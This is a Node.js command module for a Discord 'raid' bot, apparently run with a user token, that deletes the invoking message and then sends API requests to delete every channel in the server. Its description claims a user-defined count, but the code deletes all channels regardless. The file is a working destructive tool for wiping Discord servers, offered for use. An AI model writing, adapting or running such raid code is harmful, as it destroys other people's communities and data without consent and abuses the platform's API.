const axios = require("axios");
const config = require('../../config.json');
const uagent = config.uagent;
const token = config.token;
const headers = {'User-Agent': uagent, 'Authorization': token }

async function channelD(channel){
  axios
  .delete(`https://discord.com/api/v8/channels/${channel}`,{
    headers
})

  .then(res => {
    console.log("Channel Deleted");
  })
  .catch(error => {
    console.error("Error");
  });
}

module.exports = {
  name: "cd",
  category: "RAID",
  description: "Delete No of user defined channel",
  usage: "<Your Prefix>cd <amt>",
  run: async (dortrox, message) => {
    message.delete();
    message.guild.channels.cache.forEach(channel => {
        channelD(channel.id)
    });
  },
};
